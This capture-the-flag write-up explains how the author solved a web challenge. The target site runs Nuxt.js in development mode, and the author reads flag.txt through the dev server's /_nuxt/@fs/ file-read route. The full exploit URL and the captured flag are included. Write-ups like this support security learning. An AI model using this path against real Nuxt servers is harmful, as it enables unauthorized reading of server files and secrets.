# A simple website

When downloading the source-code, we see that there is a file called `flag.txt` included inside the `/src` folder.

When inspecting the website, we notice that all the Vue-files are visible and not compiled/abstracted away. This usually means that the developer has started the server in dev-mode, not production. We can verify this by checking the `Dockerfile` in the source-code:

```docker
# Start the Nuxt.js development server
CMD ["pnpm", "run", "dev", "--host", "0.0.0.0"]
```

So we should be able to exploit some dev-functionality to get an LFI (read files on the server). I came across [this report](https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/), saying the we can utilize the `fs`-package to read files:

```docker
http://ctf.tcp1p.com:45681/_nuxt/@fs/flag.txt
```

Solved! `TCP1P{OuTD4t3d_NuxxT_fR4m3w0RkK}`